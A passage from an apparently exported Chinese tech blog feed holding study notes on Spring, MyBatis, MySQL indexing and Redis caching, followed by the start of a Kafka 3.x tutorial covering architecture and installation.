方法就能得到这个 Bean</li></ol></blockquote><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/2024032783832.png"></p><p>为什么要使用三级缓存呢？二级缓存能解决循环依赖吗</p><blockquote><p>如果要使用二级缓存解决循环依赖，意味着所有Bean在实例化后就要完成AOP代理，这样<code>违背了Spring设计的原则</code>，Spring在设计之初就是通过AnnotationAwareAspectJAutoProxyCreator这个后置处理器来在Bean生命周期的最后一步来完成AOP代理，而不是在实例化后就立马进行AOP代理。</p></blockquote><h2 id="Spring事务"><a href="#Spring事务" class="headerlink" title="Spring事务"></a><strong>Spring事务</strong></h2><p>Spring事务的传播机制:</p><p>推荐文章：<a href="https://blog.csdn.net/qq_26323323/article/details/81908955">Spring事务传播机制详解</a></p><blockquote><ol><li>TransactionDefinition.PROPAGATION_REQUIRED：”如果当前存在事务，则加入该事务；如果当前没有事务，则创建一个新的事务。这是默认值。”</li><li>TransactionDefinition.PROPAGATION_REQUIRES_NEW：”创建一个新的事务，如果当前存在事务，则把当前事务挂起。”</li><li>TransactionDefinition.PROPAGATION_SUPPORTS：”如果当前存在事务，则加入该事务；如果当前没有事务，则以非事务的方式继续运行。”</li><li>TransactionDefinition.PROPAGATION_NOT_SUPPORTED：”以非事务方式运行，如果当前存在事务，则把当前事务挂起。”</li><li>TransactionDefinition.PROPAGATION_NEVER：”以非事务方式运行，如果当前存在事务，则抛出异常。”</li><li>TransactionDefinition.PROPAGATION_MANDATORY：”如果当前存在事务，则加入该事务；如果当前没有事务，则抛出异常。”</li><li>TransactionDefinition.PROPAGATION_NESTED：”如果当前存在事务，则创建一个事务作为当前事务的嵌套事务来运行；如果当前没有事务，则执行类似于TransactionDefinition.PROPAGATION_REQUIRED的操作。”</li></ol></blockquote><p>Spring事务的隔离级别:</p><blockquote><ol><li>Isolation.DEFAULT：使用底层数据库默认的隔离级别。ORACLE（读已提交）SQL SERVER（读已提交）MySQL（可重复读）。</li><li>Isolation.READ_UNCOMMITTED：最低的隔离级别，有脏读、不可重复读和幻读的风险。</li><li>Isolation.READ_COMMITTED：解决脏读的隔离级别，但有幻读以及不可重复读风险。</li><li>Isolation.REPEATABLE_READ：解决不可重复读的隔离级别，但还是有幻读风险。</li><li>Isolation.SERIALIZABLE：最高的事务隔离级别，解决了脏读、不可重复读和幻读的问题了。</li></ol></blockquote><p>Spring事务的失效场景:</p><p>推荐文章：<a href="https://blog.csdn.net/qq_16268979/article/details/123707823">Spring事务失效常见场景</a></p><blockquote><ol><li>事务方法访问修饰符非public，或者事务被static、final修饰。【可以开启 AspectJ 代理模式】</li><li>默认情况下，RuntimeException和Error才会回滚。【可使用rollbackFor指定自定义异常】</li><li>数据库本身不支持事务。【如MySQL使用存储引擎是MyISAM则不支持事务，可使用InnoDB存储引擎】</li><li>事务方法所在的类没有被Spring管理。【事务所在类没有加@Service、@Component注解等】</li><li>catch捕获异常后没有再次抛出异常。【重新抛出RuntimeException】</li><li>事务方法被类内部方法(this)调用。【调用方法和事务方法放在不同类中；注入事务所在类再通过注入类调用；通过代理类调用自己类的方法；将事务注解搬到调用方法上】</li><li>数据源没有配置事务管理器。【SpringBoot默认开启事务管理器<code>DataSourceTransactionManagerAutoConfiguration</code>】</li><li>事务传播机制设置错误。</li><li>多线程由于数据库连接不一样导致事务失效。</li></ol></blockquote><h1 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h1><h2 id="SpringMVC-的执行流程"><a href="#SpringMVC-的执行流程" class="headerlink" title="SpringMVC 的执行流程"></a>SpringMVC 的执行流程</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220516234825.png"></p><blockquote><ol><li>用户发送请求至<strong>前端控制器DispatcherServlet</strong>；</li><li>前端控制器收到请求后，调用<strong>处理器映射器HandlerMapping</strong>，请求获取<strong>Handler处理器</strong>（也可以称为controller）；</li><li>处理器映射器根据请求url找到具体的处理器，生成处理器对象及处理器拦截器(如果有则生成)一并返回给前端控制器DispatcherServlet；</li><li>前端控制器通过<strong>处理器适配器HandlerAdapter</strong>调用处理器Handler；</li><li>处理器适配器执行处理器；</li><li>处理器执行完成给适配器返回ModelAndView；</li><li>处理器适配器将ModelAndView返回给前端控制器；</li><li>前端控制器将ModelAndView传给<strong>视图解析器ViewReslover</strong>进行解析；</li><li>视图解析器解析后返回具体View；</li><li>前端控制器对View进行渲染视图（即将模型数据填充至视图中）</li><li>前端控制器向用户响应结果。</li></ol></blockquote><h1 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h1><h2 id="什么是SqlSession"><a href="#什么是SqlSession" class="headerlink" title="什么是SqlSession"></a><strong>什么是SqlSession</strong></h2><blockquote><p>SqlSession是mybatis框架中的一个对象，类似JDBC的Connection对象，是Java程序端和数据库之间的会话。<br>框架底层通过sqlSession对象去执行sql语句，帮助我们实现增删改查操作</p></blockquote><h2 id="和-的区别"><a href="#和-的区别" class="headerlink" title="#{}和${}的区别"></a><strong>#{}和${}的区别</strong></h2><blockquote><p><code>#&#123;&#125;</code>底层采用的是<code>?占位符赋值</code>的方式，调用PreparedStatement的set方法来赋值，<code>可以对SQL语句预编译</code>。</p><p><code>$&#123;&#125;</code>底层采用的是<code>字符串拼接sql</code>的方式，<code>容易产生sql注入</code>，如果需要一些<code>字段名或者关键字(比如order by)可以用$&#123;&#125;</code>。</p></blockquote><h2 id="MyBatis的缓存机制"><a href="#MyBatis的缓存机制" class="headerlink" title="MyBatis的缓存机制"></a><strong>MyBatis的缓存机制</strong></h2><blockquote><p>作用：减少web应用和数据库(磁盘)访问次数，提高查询效率，减轻数据库访问压力。</p><p>一级缓存（默认级别）：</p><p>是<strong>SqlSession级别</strong>的缓存，作用域是同一个SqlSession，在同一个sqlSession中两次执行相同的sql语句（包括参数相同），第一次执行完毕会将数据库中查询结果写到缓存，第二次会直接从缓存中获取数据，从而提高查询效率。</p><p>当SqlSession执行了DML操作（增删改），<strong>并且提交</strong>到数据库，MyBatis则会清空SqlSession中的一级缓存，避免出现脏读。当一个 SqlSession结束后，该SqlSession中的一级缓存也就不存在了。</p><p>二级缓存：</p><p>是<strong>mapper级别</strong>的缓存，其作用域是mapper的同一个namespace，两次执行相同namespace下的sql语句（包括参数相同），第一次执行完毕会将数据库中查询结果写到缓存，第二次会从缓存中获取数据将不再从数据库查询，从而提高查询效率。</p><p>mapper文件中增加标签，实体类实现序列化。<br>当执行了增删改操作，清空当前sql所对应的namespace的缓存。</p></blockquote><h2 id="MyBatis和Mybatis-Plus的区别"><a href="#MyBatis和Mybatis-Plus的区别" class="headerlink" title="MyBatis和Mybatis-Plus的区别"></a><strong>MyBatis和Mybatis-Plus的区别</strong></h2><blockquote><p>Mybatis-Plus是无侵入的，只对Mybatis做了增强不做改变。</p><ul><li><p>内置通用 Mapper、Service，仅通过少量配置即可实现单表大部分 CRUD 操作，更有强大的条件构造器，满足各类使用需求</p></li><li><p>支持 Lambda 形式调用：通过 Lambda 表达式，方便的编写各类查询条件，无需再担心字段写错。</p></li><li><p>支持主键自动生成：支持多达 4 种主键策略（内含分布式唯一 ID 生成器 - Sequence），可自由配置，完美解决主键问题。</p></li><li><p>内置代码生成器、内置分页插件</p></li><li><p>内置性能分析插件：可输出 Sql 语句以及其执行时间，建议开发测试时启用该功能，能快速揪出慢查询。</p></li><li><p>内置全局拦截插件：提供全表 delete 、 update 操作智能分析阻断，也可自定义拦截规则，预防误操作。</p></li></ul></blockquote><h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><p><a href="https://blog.csdn.net/ThinkWon/article/details/104778621">https://blog.csdn.net/ThinkWon/article/details/104778621</a></p><h2 id="基本组成模块"><a href="#基本组成模块" class="headerlink" title="基本组成模块"></a>基本组成模块</h2><p>推荐文章：<a href="https://aiguangyuan.blog.csdn.net/article/details/105618028">MySQL实战第一讲 － 一条SQL查询语句是如何执行的？</a></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215641.png" alt="20200419204847494"></p><blockquote><p>Server 层：包括<strong>连接器、查询缓存</strong>（Mysql8已移除）、<strong>分析器、优化器、执行器</strong>等，涵盖 MySQL 的大多数核心服务功能，以及所有的内置函数（如日期、时间、数学和加密函数等），所有跨存储引擎的功能都在这一层实现，比如存储过程、触发器、视图等。</p><p>存储引擎层：负责数据的<strong>存储和提取</strong>。其架构模式是插件式的，支持 InnoDB、MyISAM、Memory 等多个存储引擎。现在最常用的存储引擎是 InnoDB。</p></blockquote><h2 id="数据库三大范式"><a href="#数据库三大范式" class="headerlink" title="数据库三大范式"></a>数据库三大范式</h2><p>推荐文章：<a href="https://blog.csdn.net/ddzzz_/article/details/119277573">数据库三大范式是什么？(3NF详解)</a></p><blockquote><p>第一范式：属性不可分割</p><p>第二范式：在第一范式的基础上，非主键列完全依赖于主键，而不能是依赖于主键的一部分</p><p>第三范式：在第二范式的基础上，非主键列只依赖于主键，不依赖于其他非主键。</p></blockquote><h2 id="脏读、不可重复读、幻读"><a href="#脏读、不可重复读、幻读" class="headerlink" title="脏读、不可重复读、幻读"></a>脏读、不可重复读、幻读</h2><p>推荐文章：<a href="https://blog.csdn.net/qq_41776884/article/details/81608777">数据库事务隔离级别（脏读、幻读、不可重复读）</a></p><blockquote><ul><li><strong>脏读（Dirty read）:</strong> 当一个事务正在访问数据并且对数据进行了修改，而这种修改还没有提交到数据库中，这时另外一个事务也访问了这个数据，然后使用了这个数据。因为这个数据是还没有提交的数据，那么另外一个事务读到的这个数据是“脏数据”，依据“脏数据”所做的操作可能是不正确的。</li><li><strong>不可重复读（Unrepeatable read）:</strong> 指在一个事务内多次读同一数据。在这个事务还没有结束时，另一个事务也访问该数据。那么，在第一个事务中的两次读数据之间，由于第二个事务的修改导致第一个事务两次读取的数据可能不太一样。这就发生了在一个事务内两次读到的数据是不一样的情况，因此称为不可重复读。</li><li><strong>幻读（Phantom read）:</strong> 幻读与不可重复读类似。它发生在一个事务（T1）读取了几行数据，接着另一个并发事务（T2）插入了一些数据时。在随后的查询中，第一个事务（T1）就会发现多了一些原本不存在的记录，就好像发生了幻觉一样，所以称为幻读。</li></ul></blockquote><h2 id="事务的隔离级别"><a href="#事务的隔离级别" class="headerlink" title="事务的隔离级别"></a>事务的隔离级别</h2><blockquote><p>√表示会有该风险</p><table><thead><tr><th align="center">隔离级别</th><th align="center">脏读</th><th align="center">不可重复读</th><th align="center">幻读</th></tr></thead><tbody><tr><td align="center">READ-UNCOMMITTED(读未提交）</td><td align="center">√</td><td align="center">√</td><td align="center">√</td></tr><tr><td align="center">READ-COMMITTED(读已提交)</td><td align="center">×</td><td align="center">√</td><td align="center">√</td></tr><tr><td align="center">REPEATABLE-READ(可重复读)</td><td align="center">×</td><td align="center">×</td><td align="center">√</td></tr><tr><td align="center">SERIALIZABLE(可串行化)</td><td align="center">×</td><td align="center">×</td><td align="center">×</td></tr></tbody></table></blockquote><h2 id="MyISAM与InnoDB区别"><a href="#MyISAM与InnoDB区别" class="headerlink" title="MyISAM与InnoDB区别"></a>MyISAM与InnoDB区别</h2><blockquote><table><thead><tr><th></th><th>MyISAM</th><th>Innodb</th></tr></thead><tbody><tr><td>文件格式</td><td>数据和索引是分别存储的，数据<code>.MYD</code>，索引<code>.MYI</code></td><td>数据和索引是集中存储的<code>.ibd</code></td></tr><tr><td>记录存储顺序</td><td>按记录插入顺序保存</td><td>按主键大小有序插入</td></tr><tr><td>外键</td><td>不支持</td><td>支持</td></tr><tr><td>事务</td><td>不支持</td><td>支持</td></tr><tr><td>SELECT、INSERT、UPDATE、DELETE</td><td>SELECT更优</td><td>INSERT、UPDATE、DELETE更优</td></tr><tr><td>表的行数</td><td>存储</td><td>不存储</td></tr><tr><td>锁支持</td><td>表锁</td><td>行锁、表锁</td></tr><tr><td>主键索引类型</td><td>非聚簇索引</td><td>聚簇索引</td></tr></tbody></table></blockquote><h2 id="B树与B-树的区别"><a href="#B树与B-树的区别" class="headerlink" title="B树与B+树的区别"></a>B树与B+树的区别</h2><p>推荐文章：</p><ul><li><a href="https://blog.csdn.net/zhuanzhe117/article/details/78039692">B树与B+树简明扼要的区别</a></li><li><a href="https://blog.csdn.net/weixin_43156699/article/details/117216784">B树和B+树详解</a></li></ul><blockquote><p>结构区别：</p><ul><li>在B树中，可以将键和值存放在非叶子节点和叶子节点；但在B+树中，非叶子节点都是只有键没有值，叶子节点同时存放键和值，所有叶子节点都在同一层。</li><li>B树的叶子节点各自独立；但B+树的叶子节点增加了顺序访问指针，指向相邻叶子节点。</li></ul><p>性能区别：</p><ul><li>同一盘块中，B+树容纳的关字键更多，使得查询的IO次数更少。</li><li>B+树查询效率更加稳定，所有关键字查询的路径长度相同。</li><li>B+树便于范围查询，只需遍历链表，而B树需要中序遍历。</li></ul></blockquote><h2 id="索引类型"><a href="#索引类型" class="headerlink" title="索引类型"></a>索引类型</h2><p>推荐文章：</p><ul><li><p><a href="https://blog.csdn.net/lm1060891265/article/details/81482136">聚簇索引和非聚簇索引</a></p></li><li><p><a href="https://blog.csdn.net/mrzhouxiaofei/article/details/79940958">MySQL 之全文索引</a></p></li></ul><blockquote><p>按数据的物理存储分类，可分为聚簇索引和非聚簇索引</p><p>按索引字段特性分类，可分主键索引、唯一索引、普通索引、全文索引</p></blockquote><p>聚簇索引：</p><blockquote><ul><li>按照每张表的主键构造一颗B+树，<strong>叶子节点</strong>中存储<strong>索引值</strong>和<strong>行数据</strong>。也将聚集索引的叶子节点称为数据页。</li><li>每张表<strong>只能拥有一个</strong>聚簇索引。Innodb的聚簇索引一般都是主键索引。如果没有定义主键，Innodb会选择非空的唯一索引代替。如果没有这样的索引，Innodb会<strong>隐式定义</strong>一个主键来作为聚簇索引。</li></ul></blockquote><p>非聚簇索引（辅助索引）：</p><blockquote><ul><li>非聚簇索引的<strong>叶子节点</strong>中存储<strong>索引值</strong>和<strong>主键值</strong>（Innodb）或<strong>数据行的地址</strong>（MyISAM）。</li><li>一张表可以有多个辅助索引。</li><li>Innodb的辅助索引访问数据总是需要<strong>二次查找</strong>。拿到主键再去聚簇索引上查找也称之为<strong>回表查询</strong>。如果查询语句所要求的字段全部命中了索引，那么就不必再进行回表查询，即<strong>索引覆盖</strong>。</li></ul></blockquote><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220626234922.png"></p><h2 id="最左匹配原则"><a href="#最左匹配原则" class="headerlink" title="最左匹配原则"></a>最左匹配原则</h2><p>推荐文章：<a href="https://blog.csdn.net/sinat_41917109/article/details/88944290">Mysql最左匹配原则</a></p><blockquote><p>创建一个（a，b）的联合索引，在B+树中a的值是有顺序的，在a值相等的情况下，b值又是按顺序排列的。</p><p><strong>最左匹配原则：</strong>联合索引中以最左边的为起点任何<code>连续</code>的索引都能匹配上，遇到范围查询(&gt;、&lt;、between、like)就会停止匹配。</p><ul><li>where子句的搜索条件调换顺序不会影响查询结果，因为Mysql中有查询优化器，会自动优化查询顺序</li><li>模糊查询时：like ‘As%’走索引，like ‘%As’全表扫描， like ‘%As%’全表扫描</li><li>order by子句后面的顺序需与索引列的顺序一致才走索引</li></ul><p>比如a &#x3D; 1 and b &#x3D; 2 and c &gt; 3 and d &#x3D; 4，如果建立(a,b,c,d)顺序的索引，d是用不到索引的；如果建立(a,b,d,c)的索引则都可以用到</p></blockquote><h2 id="索引下推"><a href="#索引下推" class="headerlink" title="索引下推"></a>索引下推</h2><p>推荐文章：<a href="https://fighter3.blog.csdn.net/article/details/120199122">五分钟搞懂MySQL索引下推</a></p><blockquote><p><code>索引下推</code>的<strong>下推</strong>其实就是指将部分上层（server层）负责的事情，交给了下层（存储引擎层）去处理。目的是为了减少回表次数，也就是要减少IO操作，提高查询效率。</p><p><strong>没有使用ICP</strong>的情况下，MySQL的查询：</p><ol><li>存储引擎读取索引记录；</li><li>根据索引中的主键值，定位并读取完整的行记录；</li><li>存储引擎把行记录交给Server层去检测该记录是否满足WHERE条件。</li></ol><p><strong>使用ICP</strong>的情况下，查询过程：</p><ol><li><p>存储引擎读取索引记录（不是完整的行记录）；</p></li><li><p>判断WHERE条件部分能否用索引中的列来做检查，条件不满足，则处理下一行索引记录；</p></li></ol><p>  条件满足，使用索引中的主键去定位并读取完整的行记录（就是所谓的回表）；</p><ol start="3"><li>存储引擎把记录交给Server层，Server层检测该记录是否满足WHERE条件的其余部分。</li></ol><p><strong>使用条件</strong>：</p><ul><li>只能用于执行计划中type是range、 ref、 eq_ref、ref_or_null访问方法；</li><li>只能用于InnoDB和 MyISAM存储引擎及其分区表；</li><li>对InnoDB存储引擎来说，索引下推只适用于二级索引（也叫辅助索引）；</li><li>引用了子查询的条件不能下推；</li><li>引用了存储过程或函数的条件不能下推，因为这些都是在server层实现。</li></ul></blockquote><h2 id="MVCC-待"><a href="#MVCC-待" class="headerlink" title="MVCC(待)"></a>MVCC(待)</h2><h1 id="Reidis"><a href="#Reidis" class="headerlink" title="Reidis"></a>Reidis</h1><h2 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a><strong>缓存穿透</strong></h2><blockquote><p>缓存穿透指一个一定不存在的数据，由于<strong>缓存未命中</strong>这条数据，就会去查询数据库，<strong>数据库也没有</strong>这条数据，所以返回结果是 <code>null</code>。如果并发量大且缓存都没有命中，每次查询都请求数据库时，缓存就失去了保护后端持久层的意义，这会给持久层数据库造成很大的压力。</p><p><strong>解决方案：</strong></p><ul><li>缓存空对象：是指在持久层没有命中的情况下，对key进行set （key,null），缓存空对象会有两个问题：</li><li>value为null 不代表不<strong>占用内存空间</strong>，空值做了缓存，意味着缓存层中存了更多的键，需要更多的内存空间，比较有效的方法是针对这类数据设置一个较短的过期时间，让其自动剔除。</li><li>缓存层和持久层的数据会有一段时间窗口的不一致，可能会对业务有一定影响。例如过期时间设置为5分钟，如果此时存储层添加了这个数据，那此段时间就会出现缓存层和持久层数据的不一致，此时可以利用消息系统或者其他方式清除掉缓存层中的空对象。</li><li>布隆过滤器拦截</li><li>在访问缓存层和持久层之前，将存在的key用布隆过滤器提前保存起来，做第一层拦截，当收到一个对key请求时先用布隆过滤器验证是key否存在，如果存在再进入缓存层、持久层。可以使用bitmap做布隆过滤器。这种方法适用于数据命中不高、数据相对固定、实时性低的应用场景，代码维护较为复杂，但是缓存空间占用少。</li><li>布隆过滤器实际上是一个很长的二进制向量和一系列随机映射函数。布隆过滤器可以用于检索一个元素是否在一个集合中。它的优点是空间效率和查询时间都远远超过一般的算法，缺点是有一定的<strong>误识别率</strong>和 删除困难。</li></ul></blockquote><h2 id="缓存击穿"><a href="#缓存击穿" class="headerlink" title="缓存击穿"></a><strong>缓存击穿</strong></h2><blockquote><p>当某个key在过期的瞬间，有大量的请求并发访问，这类数据一般是<strong>热点数据</strong>，由于<strong>缓存过期</strong>，会同时访问数据库来查询最新数据，<strong>数据库有数据</strong>并且回写缓存，会导使数据库瞬间压力过大。</p><p><strong>解决方案：</strong></p><ul><li>分布式互斥锁，只允许一个线程重建缓存，其他线程等待重建缓存的线程执行完，重新从缓存获取数据即可。</li><li>这种方案思路比较简单，但是存在一定的隐患，如果在查询数据库 + 和 重建缓存（key失效后进行了大量的计算）时间过长，也可能会存在死锁和线程池阻塞的风险，高并发情景下吞吐量会大大降低！但是这种方法能够较好地降低后端存储负载，并在一致性上做得比较好。</li><li>热点Key永不过期，从功能层面来看，为每个value设置一个逻辑过期时间，当发现超过逻辑过期时间后，会使用单独的线程去更新缓存。</li><li>这种方案由于没有设置真正的过期时间，实际上已经不存在热点key产生的一系列危害，但是会存在数据不一致的情况，同时代码复杂度会增大。</li></ul></blockquote><h2 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a><strong>缓存雪崩</strong></h2><blockquote><p>由于缓存层承载着大量请求，有效地保护了持久层，但是如果缓存层由于某些原因不可用（<strong>宕机</strong>）或者大量缓存由于超时时间相同在<strong>同一时间段</strong>失效（大批key失效&#x2F;热点数据失效），大量请求直接到达存储层，存储层压力过大导致系统雪崩。</p><p><strong>解决方案：</strong></p><ul><li>缓存数据的过期时间设置随机，防止同一时间大量数据过期现象发生。</li><li>可以把缓存层设计成高可用的，即使个别节点、个别机器、甚至是机房宕掉，依然可以提供服务。利用sentinel或cluster实现。</li><li>采用多级缓存，本地进程作为一级缓存，redis作为二级缓存，不同级别的缓存设置的超时时间不同，即使某级缓存过期了，也有其他级别缓存兜底。</li><li>数据加热，在正式部署之前先把可能的数据先预先访问一遍，这样部分可能大量访问的数据就会加载到缓存中。</li></ul></blockquote><h2 id="过期的数据的删除策略"><a href="#过期的数据的删除策略" class="headerlink" title="过期的数据的删除策略"></a><strong>过期的数据的删除策略</strong></h2><blockquote><p>如果假设你设置了一批 key 只能存活 1 分钟，那么 1 分钟后，Redis 是怎么对这批 key 进行删除的呢？</p><p>常用的过期数据的删除策略就两个：</p><ul><li><p><strong>惰性删除</strong> ：只会在取出 key 的时候才对数据进行过期检查。这样对 CPU 最友好，但是可能会造成太多过期 key 没有被删除。</p></li><li><p><strong>定期删除</strong> ： 每隔一段时间抽取一批 key 执行删除过期 key 操作。并且，Redis 底层会通过限制删除操作执行的时长和频率来减少删除操作对 CPU 时间的影响。</p></li></ul><p>定期删除对内存更加友好，惰性删除对 CPU 更加友好。两者各有千秋，所以 Redis 采用的是 <strong>定期删除+惰性&#x2F;懒汉式删除</strong> 。</p><p>但是，仅仅通过给 key 设置过期时间还是有问题的。因为还是可能存在定期删除和惰性删除漏掉了很多过期 key 的情况。这样就导致大量过期 key 堆积在内存里，然后就 Out of memory 了。</p><p>怎么解决这个问题呢？答案就是：<strong>Redis 内存淘汰机制。</strong></p></blockquote><h2 id="Redis-内存淘汰机制"><a href="#Redis-内存淘汰机制" class="headerlink" title="Redis 内存淘汰机制"></a><strong>Redis 内存淘汰机制</strong></h2><blockquote><p>Redis一开始有6种数据淘汰策略，4.0版本后增加2种（7和8），总共8种</p><ol><li><strong>volatile-lru（least recently used）</strong>：从已设置过期时间的数据集（server.db[i].expires）中挑选最近最少使用的数据淘汰</li><li><strong>volatile-ttl</strong>：从已设置过期时间的数据集（server.db[i].expires）中挑选将要过期的数据淘汰</li><li><strong>volatile-random</strong>：从已设置过期时间的数据集（server.db[i].expires）中任意选择数据淘汰</li><li><strong>allkeys-lru（least recently used）</strong>：当内存不足以容纳新写入数据时，在键空间中，移除最近最少使用的 key（这个是最常用的）</li><li><strong>allkeys-random</strong>：从数据集（server.db[i].dict）中任意选择数据淘汰</li><li><strong>no-eviction</strong>：禁止驱逐数据，也就是说当内存不足以容纳新写入数据时，新写入操作会报错。这个应该没人使用吧！</li><li><strong>volatile-lfu（least frequently used）</strong>：从已设置过期时间的数据集(server.db[i].expires)中挑选最不经常使用的数据淘汰</li><li><strong>allkeys-lfu（least frequently used）</strong>：当内存不足以容纳新写入数据时，在键空间中移除最不经常使用的 key</li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kafka</title>
      <link href="/posts/13749/"/>
      <url>/posts/13749/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考视频：【尚硅谷】2022版Kafka3.x教程 <a href="https://www.bilibili.com/video/BV1vr4y1677k">https://www.bilibili.com/video/BV1vr4y1677k</a></p></blockquote><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>Kafka传统定义：Kafka是一个<strong>分布式</strong>的基于<strong>发布&#x2F;订阅模式</strong>的<strong>消息队列</strong>（Message Queue），主要应用于大数据实时处理领域。</p><p>发布&#x2F;订阅：消息的发布者不会将消息直接发送给特定的订阅者，而是<strong>将发布的消息分为不同的类别</strong>，订阅者<strong>只接收感兴趣的消息</strong>。</p><p>Kafka最新定义： Kafka是一个开源的<strong>分布式事件流平台</strong>（Event Streaming Platform），被数千家公司用于高性能<strong>数据管道、流分析、数据集成和关键任务应用</strong>。</p><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p><strong>缓冲&#x2F;消峰</strong>：有助于控制和优化数据流经过系统的速度，解决生产消息和消费消息的处理速度不一致的情况</p><p><strong>解耦：</strong>允许你独立的扩展或修改两边的处理过程，只要确保它们遵守同样的接口约束。</p><p><strong>异步通信：</strong>允许用户把一个消息放入队列，但并不立即处理它，然后在需要的时候再去处理它们。</p><h2 id="消息队列的两种模式"><a href="#消息队列的两种模式" class="headerlink" title="消息队列的两种模式"></a>消息队列的两种模式</h2><ul><li>点对点模式（一个生产者，一个消费者）<ul><li>消费者主动拉取数据，消息收到后清除消息</li></ul></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220225185206.png"></p><ul><li>发布订阅模式（一个生产者，多个消费者）<ul><li>可以有多个topic主题（浏览、点赞、收藏、评论等）</li><li>消费者消费数据之后，不删除数据</li><li>每个消费者相互独立，都可以消费到数据</li></ul></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220225185325.png"></p><h2 id="基础架构"><a href="#基础架构" class="headerlink" title="基础架构"></a>基础架构</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220226105508.png"></p><ul><li><p>Broker：代理；一台Kafka服务器就是一个broker。一个集群由多个broker组成。一个broker可以容纳多个 topic。 </p></li><li><p>Topic：主题；可以理解为一个队列，<strong>生产者和消费者面向的都是一个topic</strong>。</p></li><li><p>Producer：消息生产者；就是向 Kafka broker 发消息的客户端。 </p></li><li><p>Consumer：消息消费者；向 Kafka broker 取消息的客户端。 </p></li><li><p>Partition：分区；为了实现扩展性和提高吞吐量，一个非常大的 topic 可以分布到多个 broker（即服务器）上，一个 topic 可以分为多个 partition，每个 partition 是一个<strong>有序</strong>的队列。 </p></li><li><p>Consumer Group（CG）：消费者组；由多个 consumer 组成。消费者组内每个消费者负责消费不同分区的数据，<strong>一个分区只能由组内一个消费者消费，组内每个消费者并行消费</strong>；<strong>消费者组之间互不影响</strong>。所有的消费者都属于某个消费者组，即<strong>消费者组是逻辑上的一个订阅者</strong>。 </p></li><li><p>Replica：副本。一个 topic 的每个分区都有若干个副本，一个 Leader 和若干个Follower。 </p></li><li><p>Leader：每个分区多个副本的“主”，生产者发送数据的对象，以及消费者消费数据的对象都是 Leader。 </p></li><li><p>Follower：每个分区多个副本中的“从”，实时从 Leader 中同步数据，保持和Leader 数据的同步。Leader 发生故障时，某个 Follower 会成为新的 Leader，保证服务的可用性和数据一致性。</p></li><li><p>Offset：消息在对应 Topic 中的偏移量</p></li></ul><blockquote><p>注：</p><ul><li><p>Replica（Leader\Follower）对应的是分区 Partition，Partition(Partition-0\Partition-1)对应的是Topic</p></li><li><p>Zookeeper 中会记录整个集群中那些 broker 可用&#x2F;上线【&#x2F;brokers&#x2F;ids[0,1,2]】，也会记录每一个 partition 中的 leader 信息【&#x2F;brokers&#x2F;topics&#x2F;主题名称&#x2F;partition&#x2F;0&#x2F;state】</p></li><li><p>2.8.0 之后也可以不配置 Zookeeper 作为注册中心，未来的趋势也是去 Zookeeper  化</p></li></ul></blockquote><h1 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h1><h2 id="安装部署"><a href="#安装部署" class="headerlink" title="安装部署"></a>安装部署</h2><p>集群规划：</p><table><thead><tr><th>服务器名称</th><th>hadoop102</th><th>hadoop103</th><th>hadoop104</th></tr></thead><tbody><tr><td>依赖的服务</td><td>ZooKeeper</td><td>ZooKeeper</td><td>ZooKeeper</td></tr><tr><td>服务</td><td>Kafka</td><td>Kafka</td><td>Kafka</td></tr></tbody></table><p>官网下载链接，选择Binary downloads： <a href="https://kafka.apache.org/downloads.html">https://kafka.apache.org/downloads.html</a></p><p>Kafka是由Scala语言编写，<a href="https://www.apache.org/dyn/closer.cgi?path=/kafka/3.1.0/kafka_2.12-3.1.0.tgz">kafka_2.12-3.1.0.tgz</a>代表是使用scala 2.12 版本编写的3.1.0版本的Kafka</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">上传至服务器并解压</span></span><br><span class="line">[root@nanzx opt]# tar -zxvf kafka_2.12-3.1.0.tgz -C /opt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改解压后的文件名称</span></span><br><span class="line">[root@nanzx opt]# mv kafka_2.12-3.1.0/ kafka</span><br></pre></td></tr></table></figure><p>进入config目录修改配置文件 server.properties（主要是broker.id&#x2F;log.dirs&#x2F;zookeeper.connect）：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 